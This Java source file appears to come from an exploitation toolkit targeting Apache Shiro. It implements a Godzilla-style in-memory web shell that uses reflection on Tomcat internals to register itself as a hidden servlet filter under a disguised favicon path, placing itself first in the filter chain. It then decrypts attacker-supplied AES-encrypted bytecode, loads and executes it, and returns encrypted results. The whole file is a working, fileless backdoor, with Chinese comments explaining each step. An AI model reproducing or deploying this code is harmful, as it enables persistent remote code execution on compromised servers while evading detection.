package com.liev.clouds.exp.shiro.shell;

import org.apache.catalina.LifecycleState;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.util.LifecycleBase;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.FilterRegistration.Dynamic;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.EnumSet;

public class GodzillaFilter extends ClassLoader implements Filter {
    // HTTP 请求和响应对象
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    // AES 加密密钥
    String xc = "3c6e0b8a9c15224a";
    // 密码和路径
    public String Pwd = "favicon";
    public String path = "/favicons.ico";
    // 用于校验的 MD5 哈希值
    String md5;
    // 字符编码
    public String cs;

    // 构造函数，初始化 MD5 值和字符编码
    public GodzillaFilter() {
        this.md5 = md5(this.Pwd + this.xc);
        this.cs = "UTF-8";
    }

    // 构造函数，允许传入类加载器
    public GodzillaFilter(ClassLoader z) {
        super(z);
        this.md5 = md5(this.Pwd + this.xc);
        this.cs = "UTF-8";
    }

    // 定义类的方法，用于动态加载字节码
    public Class Q(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }

    // 加密/解密方法，使用 AES 算法
    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? Cipher.ENCRYPT_MODE : Cipher.DECRYPT_MODE, new SecretKeySpec(this.xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception var4) {
            return null;
        }
    }

    // 计算字符串的 MD5 哈希值
    public static String md5(String s) {
        String ret = null;

        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase();
        } catch (Exception var3) {
        }

        return ret;
    }

    // 将字节数组进行 Base64 编码
    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;

        try {
            // Java 8 及以上版本的 Base64 编码
            Class base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder").invoke(base64);
            value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, bs);
        } catch (Exception var6) {
            try {
                // Java 7 及以下版本的 Base64 编码
                Class base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, bs);
            } catch (Exception var5) {
            }
        }

        return value;
    }

    // 将 Base64 编码的字符串解码为字节数组
    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;

        try {
            // Java 8 及以上版本的 Base64 解码
            Class base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder").invoke(base64);
            value = (byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            try {
                // Java 7 及以下版本的 Base64 解码
                Class base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[])decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
            } catch (Exception var5) {
            }
        }

        return value;
    }

    // equals 方法用于处理请求，添加过滤器，并返回操作结果
    public boolean equals(Object obj) {
        // 解析传入的对象以获取请求和响应对象
        this.parseObj(obj);
        // 获取请求头中的密码和路径
        this.Pwd = this.request.getHeader("p");
        this.path = this.request.getHeader("path");
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            // 设置响应内容类型和字符编码
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            // 添加过滤器
            output.append(this.addFilter());
        } catch (Exception var7) {
            output.append("error:" + var7.toString());
        }

        try {
            // 输出结果到响应
            this.response.getWriter().print(tag_s + output.toString() + tag_e);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var6) {
        }

        return true;
    }

    // 解析传入的对象，以获取 HttpServletRequest 和 HttpServletResponse 对象
    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            // 如果传入的是数组，假设第一个元素是请求，第二个是响应
            Object[] data = (Object[])obj;
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                // 如果传入的是 PageContext 对象，通过反射获取请求和响应
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    // 如果直接是请求对象，尝试获取其内部的请求和响应对象
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }
    }

    // 动态添加过滤器
    public String addFilter() throws Exception {
        ServletContext servletContext = this.request.getServletContext();
        Filter filter = this; // 当前实例作为过滤器
        String filterName = this.path; // 过滤器名称
        String url = this.path; // 过滤器映射的路径

        if (servletContext.getFilterRegistration(filterName) == null) {
            // 通过反射操作 Tomcat 的内部结构
            Field contextField = null;
            ApplicationContext applicationContext = null;
            StandardContext standardContext = null;
            Field stateField = null;
            Dynamic filterRegistration = null;

            String resultMessage;
            try {
                // 获取并设置标准上下文的生命周期状态，以便添加过滤器
                contextField = servletContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                applicationContext = (ApplicationContext)contextField.get(servletContext);
                contextField = applicationContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                standardContext = (StandardContext)contextField.get(applicationContext);
                stateField = LifecycleBase.class.getDeclaredField("state");
                stateField.setAccessible(true);
                stateField.set(standardContext, LifecycleState.STARTING_PREP);

                // 注册并添加过滤器映射
                filterRegistration = servletContext.addFilter(filterName, filter);
                filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, url);

                // 启动过滤器
                Method filterStartMethod = StandardContext.class.getMethod("filterStart");
                filterStartMethod.setAccessible(true);
                filterStartMethod.invoke(standardContext);
                stateField.set(standardContext, LifecycleState.STARTED);
                resultMessage = "Success";

                // 确保过滤器的映射被优先处理
                Class filterMap;
                try {
                    filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                } catch (Exception var21) {
                    filterMap = Class.forName("org.apache.catalina.deploy.FilterMap");
                }

                Method findFilterMaps = standardContext.getClass().getMethod("findFilterMaps");
                Object[] filterMaps = (Object[])findFilterMaps.invoke(standardContext);

                for (int i = 0; i < filterMaps.length; ++i) {
                    Object filterMapObj = filterMaps[i];
                    findFilterMaps = filterMap.getMethod("getFilterName");
                    String name = (String)findFilterMaps.invoke(filterMapObj);
                    if (name.equalsIgnoreCase(filterName)) {
                        filterMaps[i] = filterMaps[0];
                        filterMaps[0] = filterMapObj;
                    }
                }
            } catch (Exception var22) {
                resultMessage = var22.getMessage();
            } finally {
                // 确保在异常情况下恢复上下文的生命周期状态
                stateField.set(standardContext, LifecycleState.STARTED);
            }

            return resultMessage;
        } else {
            return "Filter already exists";
        }
    }

    // 初始化过滤器配置（这里未实现任何逻辑）
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    // 执行过滤器的核心逻辑
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {
        try {
            HttpServletRequest request = (HttpServletRequest)req;
            HttpServletResponse response = (HttpServletResponse)resp;
            HttpSession session = request.getSession();

            // 从请求中获取加密的字节码数据并解密
            byte[] data = base64Decode(req.getParameter(this.Pwd));
            data = this.x(data, false);

            if (session.getAttribute("payload") == null) {
                // 如果会话中没有存储的字节码类，加载并存储
                session.setAttribute("payload", (new GodzillaFilter(this.getClass().getClassLoader())).Q(data));
            } else {
                // 如果会话中已有字节码类，执行该字节码
                request.setAttribute("parameters", data);
                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                Object f = ((Class)session.getAttribute("payload")).newInstance();
                f.equals(arrOut); // 执行字节码的 equals 方法
                f.equals(request); // 执行字节码的 equals 方法
                response.getWriter().write(this.md5.substring(0, 16)); // 写入响应的一部分
                f.toString(); // 执行字节码的 toString 方法
                response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true))); // 输出加密后的执行结果
                response.getWriter().write(this.md5.substring(16)); // 写入响应的剩余部分
            }
        } catch (Exception var10) {
        }
    }

    // 销毁过滤器（这里未实现任何逻辑）
    public void destroy() {
    }
}
